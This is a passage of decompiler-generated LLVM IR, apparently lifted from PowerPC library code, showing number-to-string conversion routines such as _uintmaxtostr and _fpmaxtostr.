dec_label_pc_1002137c:                            ; preds = %dec_label_pc_10021368
  %v3_10021368 = icmp eq i32 %v0_10021354, 512
  %v0_10021380 = load i32, i32* @r6, align 4
  br i1 %v3_10021368, label %dec_label_pc_10021380, label %dec_label_pc_10021388

dec_label_pc_10021380:                            ; preds = %dec_label_pc_1002137c
  %v1_10021380 = trunc i32 %v0_10021380 to i16
  store i16 %v1_10021380, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10021388:                            ; preds = %dec_label_pc_1002137c
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10021380, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 0, 1, 2, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10021394 = load i32, i32* %r7.global-to-local, align 4
  %v3_10021394 = icmp eq i32 %v0_10021394, 0
  store i1 %v3_10021394, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp13 = icmp sgt i32 %v0_10021394, -1
  br i1 %tmp13, label %dec_label_pc_100213c4, label %dec_label_pc_100213a4

dec_label_pc_100213a4:                            ; preds = %entry
  %v0_100213a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100213a8 = sub i32 0, %v0_10021394
  store i32 %v1_100213a8, i32* %r7.global-to-local, align 4
  %tmp14 = icmp sgt i32 %v0_100213a4, -1
  br i1 %tmp14, label %dec_label_pc_100213c4, label %dec_label_pc_100213b0

dec_label_pc_100213b0:                            ; preds = %dec_label_pc_100213a4
  %v0_100213b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_100213b0 = sub i32 0, %v0_100213b0
  %v2_100213b0 = sub i32 -1, %v0_100213b0
  store i32 %v1_100213b0, i32* %r6.global-to-local, align 4
  %v4_100213b0 = icmp uge i32 %v2_100213b0, %v1_100213b0
  %v1_100213b4 = sub i32 -1, %v0_100213a4
  %v3_100213b4 = zext i1 %v4_100213b0 to i32
  %v4_100213b4 = add i32 %v3_100213b4, %v1_100213b4
  store i32 %v4_100213b4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100213c4

dec_label_pc_100213c4:                            ; preds = %entry, %dec_label_pc_100213a4, %dec_label_pc_100213b0
  %v1_100213c8 = phi i32 [ %v1_100213a8, %dec_label_pc_100213b0 ], [ %v1_100213a8, %dec_label_pc_100213a4 ], [ %v0_10021394, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_100213b0 ], [ 0, %dec_label_pc_100213a4 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_100213c8 = udiv i32 -1, %v1_100213c8
  store i32 %v2_100213c8, i32* @r8, align 4
  %v2_100213d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_100213d0 = inttoptr i32 %v2_100213d0 to i8*
  store i8 0, i8* %v3_100213d0, align 1
  %v0_100213d4 = load i32, i32* @r8, align 4
  %v1_100213d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_100213d4 = mul i32 %v1_100213d4, %v0_100213d4
  %v1_100213d8 = sub i32 0, %v2_100213d4
  store i32 %v1_100213d8, i32* @r31, align 4
  %v4_100213dc = icmp eq i32 %v1_100213d4, %v1_100213d8
  br i1 %v4_100213dc, label %dec_label_pc_100213e4, label %dec_label_pc_100213ec

dec_label_pc_100213e4:                            ; preds = %dec_label_pc_100213c4
  %v1_100213e4 = add i32 %v0_100213d4, 1
  store i32 %v1_100213e4, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100213ec

dec_label_pc_100213ec:                            ; preds = %dec_label_pc_100213c4, %dec_label_pc_100213e4
  %v0_100213ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_100213ec, i32* %r12.global-to-local, align 4
  %v0_100213f0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_100213f0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100213f4

dec_label_pc_100213f4thread-pre-split:            ; preds = %dec_label_pc_10021448
  %v0_100213f4.pr = load i32, i32* %r12.global-to-local, align 4
  %v0_100213f8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100213f8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100213f4

dec_label_pc_100213f4:                            ; preds = %dec_label_pc_100213f4thread-pre-split, %dec_label_pc_100213ec
  %v1_1002143c = phi i32 [ %v1_100213f8.pre, %dec_label_pc_100213f4thread-pre-split ], [ %v1_100213d4, %dec_label_pc_100213ec ]
  %v1_10021440 = phi i32 [ %v0_100213f8.pre, %dec_label_pc_100213f4thread-pre-split ], [ %v0_100213f0, %dec_label_pc_100213ec ]
  %v1_10021410 = phi i32 [ %v0_100213f4.pr, %dec_label_pc_100213f4thread-pre-split ], [ %v0_100213ec, %dec_label_pc_100213ec ]
  %v3_100213f4 = icmp eq i32 %v1_10021410, 0
  %v2_100213f8 = udiv i32 %v1_10021440, %v1_1002143c
  br i1 %v3_100213f4, label %dec_label_pc_1002143c, label %dec_label_pc_10021400

dec_label_pc_10021400:                            ; preds = %dec_label_pc_100213f4
  %v2_10021400 = udiv i32 %v1_10021410, %v1_1002143c
  %v2_10021404 = mul i32 %v2_100213f8, %v1_1002143c
  %v2_10021408 = mul i32 %v2_10021400, %v1_1002143c
  %v2_1002140c = sub i32 %v1_10021440, %v2_10021404
  %v2_10021410 = sub i32 %v1_10021410, %v2_10021408
  store i32 %v2_10021400, i32* %r12.global-to-local, align 4
  %v0_10021418 = load i32, i32* @r31, align 4
  %v2_10021418 = mul i32 %v0_10021418, %v2_10021410
  %v0_1002141c = load i32, i32* @r8, align 4
  %v2_1002141c = mul i32 %v0_1002141c, %v2_10021410
  %v2_10021420 = add i32 %v2_10021418, %v2_1002140c
  %v2_10021424 = udiv i32 %v2_10021420, %v1_1002143c
  %v2_10021428 = add i32 %v2_1002141c, %v2_100213f8
  %v2_1002142c = mul i32 %v2_10021424, %v1_1002143c
  store i32 %v2_1002142c, i32* @r10, align 4
  %v2_10021430 = add i32 %v2_10021424, %v2_10021428
  store i32 %v2_10021430, i32* %r11.global-to-local, align 4
  %v2_10021434 = sub i32 %v2_10021420, %v2_1002142c
  store i32 %v2_10021434, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021448

dec_label_pc_1002143c:                            ; preds = %dec_label_pc_100213f4
  %v2_1002143c = mul i32 %v2_100213f8, %v1_1002143c
  %v2_10021440 = sub i32 %v1_10021440, %v2_1002143c
  store i32 %v2_10021440, i32* %r5.global-to-local, align 4
  store i32 %v2_100213f8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10021448

dec_label_pc_10021448:                            ; preds = %dec_label_pc_10021400, %dec_label_pc_1002143c
  %v1_10021450 = phi i32 [ %v2_10021400, %dec_label_pc_10021400 ], [ 0, %dec_label_pc_1002143c ]
  %v0_10021450 = phi i32 [ %v2_10021430, %dec_label_pc_10021400 ], [ %v2_100213f8, %dec_label_pc_1002143c ]
  %v0_10021454 = phi i32 [ %v2_10021434, %dec_label_pc_10021400 ], [ %v2_10021440, %dec_label_pc_1002143c ]
  %v1_1002144c = load i32, i32* @r30, align 4
  %v2_10021450 = or i32 %v0_10021450, %v1_10021450
  %v5_10021450 = icmp eq i32 %v2_10021450, 0
  store i1 %v5_10021450, i1* %cr0_eq.global-to-local, align 1
  %v0_10021458 = load i32, i32* %r3.global-to-local, align 4
  %v1_10021458 = add i32 %v0_10021458, -1
  store i32 %v1_10021458, i32* %r3.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10021454, 10
  %v1_10021454.v2_1002144c.v = select i1 %tmp15, i32 48, i32 %v1_1002144c
  %v1_10021454.v2_1002144c = add i32 %v0_10021454, %v1_10021454.v2_1002144c.v
  %extract.t10.extract.t = trunc i32 %v1_10021454.v2_1002144c to i8
  %v3_10021468 = inttoptr i32 %v1_10021458 to i8*
  store i8 %extract.t10.extract.t, i8* %v3_10021468, align 1
  %v0_1002146c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1002146c, label %dec_label_pc_10021470, label %dec_label_pc_100213f4thread-pre-split

dec_label_pc_10021470:                            ; preds = %dec_label_pc_10021448
  %v0_10021470 = load i32, i32* @r29, align 4
  %v3_10021470 = icmp eq i32 %v0_10021470, 0
  br i1 %v3_10021470, label %dec_label_pc_10021470.dec_label_pc_10021480_crit_edge, label %dec_label_pc_10021478

dec_label_pc_10021470.dec_label_pc_10021480_crit_edge: ; preds = %dec_label_pc_10021470
  %v0_10021488.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021480

dec_label_pc_10021478:                            ; preds = %dec_label_pc_10021470
  %v2_1002147c = load i32, i32* %r3.global-to-local, align 4
  %v3_1002147c = add i32 %v2_1002147c, -1
  %v4_1002147c = inttoptr i32 %v3_1002147c to i8*
  store i8 45, i8* %v4_1002147c, align 1
  store i32 %v3_1002147c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021480

dec_label_pc_10021480:                            ; preds = %dec_label_pc_10021470.dec_label_pc_10021480_crit_edge, %dec_label_pc_10021478
  %v0_10021488 = phi i32 [ %v0_10021488.pre, %dec_label_pc_10021470.dec_label_pc_10021480_crit_edge ], [ %v3_1002147c, %dec_label_pc_10021478 ]
  ret i32 %v0_10021488

; uselistorder directives
  uselistorder i32 %v2_10021424, { 1, 0 }
  uselistorder i32 %v2_10021400, { 1, 2, 0 }
  uselistorder i32 %v2_100213f8, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1002143c, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_100213d4, { 1, 2, 0 }
  uselistorder i32 %v0_100213d4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10021480, { 1, 0 }
  uselistorder label %dec_label_pc_10021448, { 1, 0 }
  uselistorder label %dec_label_pc_100213ec, { 1, 0 }
  uselistorder label %dec_label_pc_100213c4, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10021490 = load i32, i32* @lr, align 4
  store i32 101, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_100214ac = add i32 %tmp, 11
  %v2_100214ac = inttoptr i32 %v1_100214ac to i8*
  %v3_100214ac = load i8, i8* %v2_100214ac, align 1
  %v4_100214ac = zext i8 %v3_100214ac to i32
  store i32 %v4_100214ac, i32* %r31.global-to-local, align 4
  %v1_100214b4 = or i32 %v4_100214ac, 32
  store i32 %v1_100214b4, i32* %r0.global-to-local, align 4
  %v1_100214b8 = icmp ult i32 %v1_100214b4, 97
  %v3_100214b8 = icmp eq i32 %v1_100214b4, 97
  store i1 %v1_100214b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100214b8, i1* %cr7_eq.global-to-local, align 1
  %v1_100214bc = add i32 %tmp, 4
  %v2_100214bc = inttoptr i32 %v1_100214bc to i32*
  %v3_100214bc = load i32, i32* %v2_100214bc, align 4
  store i32 %v3_100214bc, i32* %r28.global-to-local, align 4
  %v2_100214c0 = load i32, i32* %arg2, align 4
  store i32 %v2_100214c0, i32* %r30.global-to-local, align 4
  br i1 %v3_100214b8, label %dec_label_pc_100214c8, label %dec_label_pc_100214d0

dec_label_pc_100214c8:                            ; preds = %entry
  %v1_100214c8 = add nuw nsw i32 %v4_100214ac, 6
  store i32 %v1_100214c8, i32* %r0.global-to-local, align 4
  %v1_100214cc = urem i32 %v1_100214c8, 256
  store i32 %v1_100214cc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100214d0

dec_label_pc_100214d0:                            ; preds = %entry, %dec_label_pc_100214c8
  %v0_10021588 = phi i32 [ %v4_100214ac, %entry ], [ %v1_100214cc, %dec_label_pc_100214c8 ]
  %v1_100214d0 = icmp slt i32 %v2_100214c0, 0
  %v3_100214d0 = icmp eq i32 %v2_100214c0, 0
  store i1 %v1_100214d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100214d0, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_100214c0, -1
  br i1 %tmp75, label %dec_label_pc_100214dc, label %dec_label_pc_100214d8

dec_label_pc_100214d8:                            ; preds = %dec_label_pc_100214d0
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100214dc

dec_label_pc_100214dc:                            ; preds = %dec_label_pc_100214d0, %dec_label_pc_100214d8
  %v0_1002169444 = phi i32 [ %v2_100214c0, %dec_label_pc_100214d0 ], [ 6, %dec_label_pc_100214d8 ]
  %v1_100214dc = add i32 %tmp, 12
  %v2_100214dc = inttoptr i32 %v1_100214dc to i32*
  %v3_100214dc = load i32, i32* %v2_100214dc, align 4
  store i32 %v3_100214dc, i32* %r9.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  %v1_100214e8 = and i32 %v3_100214dc, 2
  store i32 %v1_100214e8, i32* %r0.global-to-local, align 4
  %v3_100214e8 = icmp eq i32 %v1_100214e8, 0
  br i1 %v3_100214e8, label %dec_label_pc_100214f8, label %dec_label_pc_10021504

dec_label_pc_100214f8:                            ; preds = %dec_label_pc_100214dc
  %v1_100214f8 = urem i32 %v3_100214dc, 2
  store i32 %v1_100214f8, i32* %r7.global-to-local, align 4
  %v3_100214f8 = icmp eq i32 %v1_100214f8, 0
  br i1 %v3_100214f8, label %dec_label_pc_10021508, label %dec_label_pc_10021504

dec_label_pc_10021504:                            ; preds = %dec_label_pc_100214f8, %dec_label_pc_100214dc
  %storemerge = phi i32 [ 43, %dec_label_pc_100214dc ], [ 32, %dec_label_pc_100214f8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10021504 = trunc i32 %storemerge to i8
  store i8 %v6_10021504, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10021508

dec_label_pc_10021508:                            ; preds = %dec_label_pc_100214f8, %dec_label_pc_10021504
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100214d0, label %dec_label_pc_1002166c, label %dec_label_pc_10021584

dec_label_pc_10021584:                            ; preds = %dec_label_pc_10021508
  %v1_10021588 = icmp ult i32 %v0_10021588, 96
  %v2_10021588 = icmp ugt i32 %v0_10021588, 96
  %v3_10021588 = icmp eq i32 %v0_10021588, 96
  store i1 %v1_10021588, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021588, i1* %cr7_eq.global-to-local, align 1
  %v2_1002158c = add i32 %tmp, 16
  %v3_1002158c = inttoptr i32 %v2_1002158c to i32*
  store i32 32, i32* %v3_1002158c, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10021588, label %dec_label_pc_100215b0, label %dec_label_pc_100215a4

dec_label_pc_100215a4:                            ; preds = %dec_label_pc_10021584
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100215b0

dec_label_pc_100215b0:                            ; preds = %dec_label_pc_10021584, %dec_label_pc_100215a4
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1002f978.1287 to i32), i32 8), %dec_label_pc_10021584 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1002f978.1287 to i32), i32 12), %dec_label_pc_100215a4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1002f978.1287 to i32), i32* %r9.global-to-local, align 4
  %v2_100215bc = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_100215bc, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10021a5c

dec_label_pc_1002166c:                            ; preds = %dec_label_pc_10021508
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10021670 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10021670, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_100216bc = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10021690

dec_label_pc_10021690:                            ; preds = %dec_label_pc_10021710.dec_label_pc_10021690_crit_edge, %dec_label_pc_1002166c
  %v0_10021694 = phi i32 [ %v0_10021694.pre, %dec_label_pc_10021710.dec_label_pc_10021690_crit_edge ], [ %v0_1002169444, %dec_label_pc_1002166c ]
  %v3_10021694 = call %1 @__asm_cror(i32 %v0_10021694, i32 %tmp, i32 %v0_10021694)
  %v0_10021698 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10021698, label %dec_label_pc_100216ac, label %dec_label_pc_100216c0

dec_label_pc_100216ac:                            ; preds = %dec_label_pc_10021690
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100216c0

dec_label_pc_100216c0:                            ; preds = %dec_label_pc_10021690, %dec_label_pc_100216ac
  %storemerge2 = phi i32 [ %v1_100216bc, %dec_label_pc_100216ac ], [ %tmp55, %dec_label_pc_10021690 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_100216d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_100216d0 = add i32 %v0_100216d0, 9
  store i32 %v1_100216d0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100216ec

dec_label_pc_100216ec:                            ; preds = %dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge, %dec_label_pc_100216c0
  %v1_100216f4 = phi i32 [ %v1_100216f4.pre, %dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge ], [ %v1_100216d0, %dec_label_pc_100216c0 ]
  %v0_100216f0 = phi i32 [ %v0_100216f0.pre, %dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge ], [ 0, %dec_label_pc_100216c0 ]
  %v1_100216ec = phi i32 [ %v1_100216ec.pre, %dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge ], [ 10, %dec_label_pc_100216c0 ]
  %v1_100216fc = phi i32 [ %v0_100216ec.pre, %dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge ], [ %storemerge2, %dec_label_pc_100216c0 ]
  %v2_100216ec = udiv i32 %v1_100216fc, %v1_100216ec
  store i32 %v2_100216ec, i32* %r0.global-to-local, align 4
  %v1_100216f0 = add i32 %v0_100216f0, 1
  store i32 %v1_100216f0, i32* %r8.global-to-local, align 4
  %v2_100216f4 = sub i32 %v1_100216f4, %v1_100216f0
  store i32 %v2_100216f4, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_100216ec, -10
  store i32 %v2_100216ec, i32* %r10.global-to-local, align 4
  %v2_100216fc = add i32 %v1_100216fc, 48
  %v1_10021704 = add i32 %v2_100216fc, %tmp76
  store i32 %v1_10021704, i32* %r9.global-to-local, align 4
  %v1_10021708 = trunc i32 %v1_10021704 to i8
  %v3_10021708 = inttoptr i32 %v2_100216f4 to i8*
  store i8 %v1_10021708, i8* %v3_10021708, align 1
  %v0_1002170c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002170c = add i32 %v0_1002170c, -1
  store i32 %v1_1002170c, i32* %ctr.global-to-local, align 4
  %v2_1002170c = icmp eq i32 %v1_1002170c, 0
  br i1 %v2_1002170c, label %dec_label_pc_10021710, label %dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge

dec_label_pc_100216ec.dec_label_pc_100216ec_crit_edge: ; preds = %dec_label_pc_100216ec
  %v0_100216ec.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100216ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_100216f0.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_100216f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100216ec

dec_label_pc_10021710:                            ; preds = %dec_label_pc_100216ec
  %v0_10021710 = load i32, i32* %r7.global-to-local, align 4
  %v1_10021710 = icmp slt i32 %v0_10021710, 0
  %v3_10021710 = icmp eq i32 %v0_10021710, 0
  store i1 %v1_10021710, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021710, i1* %cr7_eq.global-to-local, align 1
  %v1_10021714 = add i32 %v0_10021710, 1
  store i32 %v1_10021714, i32* %r7.global-to-local, align 4
  br i1 %v3_10021710, label %dec_label_pc_10021710.dec_label_pc_10021690_crit_edge, label %dec_label_pc_1002171c

dec_label_pc_10021710.dec_label_pc_10021690_crit_edge: ; preds = %dec_label_pc_10021710
  %v0_10021694.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10021690

dec_label_pc_1002171c:                            ; preds = %dec_label_pc_10021710
  %v0_1002171c = load i32, i32* %r31.global-to-local, align 4
  %v1_1002171c = icmp ult i32 %v0_1002171c, 96
  %v2_1002171c = icmp ugt i32 %v0_1002171c, 96
  %v3_1002171c = icmp eq i32 %v0_1002171c, 96
  store i1 %v1_1002171c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002171c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1002171c, label %dec_label_pc_10021734, label %dec_label_pc_10021724

dec_label_pc_10021724:                            ; preds = %dec_label_pc_1002171c
  %v1_1002172c = add i32 %v0_1002171c, 32
  store i32 %v1_1002172c, i32* %r0.global-to-local, align 4
  %v1_10021730 = urem i32 %v1_1002172c, 256
  store i32 %v1_10021730, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10021734

dec_label_pc_10021734:                            ; preds = %dec_label_pc_1002171c, %dec_label_pc_10021724
  %v0_1002174c = phi i32 [ %v1_10021730, %dec_label_pc_10021724 ], [ %v0_1002171c, %dec_label_pc_1002171c ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10021724 ], [ 101, %dec_label_pc_1002171c ]
  %v1_10021734 = icmp slt i32 %v0_1002174c, 103
  %v3_10021734 = icmp eq i32 %v0_1002174c, 103
  store i1 %v1_10021734, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021734, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021734, label %dec_label_pc_1002173c, label %dec_label_pc_1002174c

dec_label_pc_1002173c:                            ; preds = %dec_label_pc_10021734
  %v0_1002173c = load i32, i32* %r30.global-to-local, align 4
  %v1_1002173c = icmp slt i32 %v0_1002173c, 0
  %v3_1002173c = icmp eq i32 %v0_1002173c, 0
  store i1 %v1_1002173c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002173c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1002173c, label %dec_label_pc_10021754, label %dec_label_pc_10021744

dec_label_pc_10021744:                            ; preds = %dec_label_pc_1002173c
  %v1_10021744 = add i32 %v0_1002173c, -1
  store i32 %v1_10021744, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10021754

dec_label_pc_1002174c:                            ; preds = %dec_label_pc_10021734
  %v1_1002174c = icmp slt i32 %v0_1002174c, 102
  %v3_1002174c = icmp eq i32 %v0_1002174c, 102
  store i1 %v1_1002174c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002174c, i1* %cr7_eq.global-to-local, align 1
  %v0_1002175c = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1002174c, label %dec_label_pc_1002175c, label %dec_label_pc_10021754

dec_label_pc_10021754:                            ; preds = %dec_label_pc_1002174c, %dec_label_pc_1002173c, %dec_label_pc_10021744
  %v0_10021754 = phi i32 [ 0, %dec_label_pc_1002173c ], [ %v1_10021744, %dec_label_pc_10021744 ], [ %v0_1002175c, %dec_label_pc_1002174c ]
  store i32 %v0_10021754, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10021780

dec_label_pc_1002175c:                            ; preds = %dec_label_pc_1002174c
  %v1_1002175c = load i32, i32* %r5.global-to-local, align 4
  %v2_1002175c = add i32 %v1_1002175c, %v0_1002175c
  store i32 %v2_1002175c, i32* %r10.global-to-local, align 4
  %v1_10021760 = icmp slt i32 %v2_1002175c, -1
  %v3_10021760 = icmp eq i32 %v2_1002175c, -1
  store i1 %v1_10021760, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021760, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1002175c, -2
  br i1 %tmp77, label %dec_label_pc_10021780, label %dec_label_pc_10021768

dec_label_pc_10021768:                            ; preds = %dec_label_pc_1002175c
  store i32 17, i32* @r5, align 4
  %v2_1002176c = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1002176c, i32* @r3, align 4
  store i32 48, i32* @r4, align 4
  store i32 268572536, i32* @lr, align 4
  %v0_10021774 = call i32 @__GI_memset()
  store i32 %v0_10021774, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021780

dec_label_pc_10021780:                            ; preds = %dec_label_pc_1002175c, %dec_label_pc_10021754, %dec_label_pc_10021768
  %v1_100217a4 = phi i32 [ %v2_1002175c, %dec_label_pc_1002175c ], [ %v0_10021754, %dec_label_pc_10021754 ], [ -1, %dec_label_pc_10021768 ]
  %v1_10021784 = icmp slt i32 %v1_100217a4, 16
  %v2_10021784 = icmp sgt i32 %v1_100217a4, 16
  %v3_10021784 = icmp eq i32 %v1_100217a4, 16
  store i1 %v1_10021784, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021784, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10021794 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10021794, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10021784, label %dec_label_pc_100217bc, label %dec_label_pc_100217a0

dec_label_pc_100217a0:                            ; preds = %dec_label_pc_10021780
  %v2_100217a0 = ptrtoint i32* %stack_var_-177 to i32
  %v2_100217a4 = add i32 %v1_100217a4, %v2_100217a0
  store i32 %v2_100217a4, i32* %r9.global-to-local, align 4
  %v1_100217a8 = add i32 %v2_100217a4, 2
  %v2_100217a8 = inttoptr i32 %v1_100217a8 to i8*
  %v3_100217a8 = load i8, i8* %v2_100217a8, align 1
  %v4_100217a8 = zext i8 %v3_100217a8 to i32
  store i32 %v4_100217a8, i32* %r0.global-to-local, align 4
  store i32 %v1_100217a8, i32* %r11.global-to-local, align 4
  %v1_100217b0 = sub nsw i32 52, %v4_100217a8
  %v2_100217b0 = sub nuw nsw i32 -1, %v4_100217a8
  %not.v5_100217b0 = icmp ugt i32 %v1_100217b0, %v2_100217b0
  %v1_100217b8 = zext i1 %not.v5_100217b0 to i32
  store i32 %v1_100217b8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100217bc

